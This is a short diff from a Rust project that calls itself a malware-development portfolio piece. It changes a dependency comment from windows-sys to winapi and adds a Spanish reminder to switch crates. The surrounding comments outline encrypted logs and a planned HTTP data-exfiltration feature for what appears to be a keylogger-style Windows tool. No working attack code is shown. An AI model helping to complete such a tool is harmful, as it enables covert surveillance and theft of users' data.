@@ -73,7 +73,7 @@ The main goal is proving some maldev portfolio + rust skills.
 //          functions normally.
 
 // # Dependencies (Crates to consider)
-// - `windows-sys`: For direct calls to the Windows API.
+// - `winapi`: For direct calls to the Windows API.
 // - `chrono`: For timestamp management.
 // - `aes-gcm` or `chacha20poly1305`: For log encryption.
 // - `reqwest`: (Future) For data exfiltration over HTTP.
@@ -123,6 +123,8 @@ fn main() {
 
 }
 
+
+// CAMBIAR POR winapi !!!!
 use windows_sys::Win32::{
     Foundation::{HINSTANCE, LPARAM, LRESULT, WPARAM},
     UI::WindowsAndMessaging::{
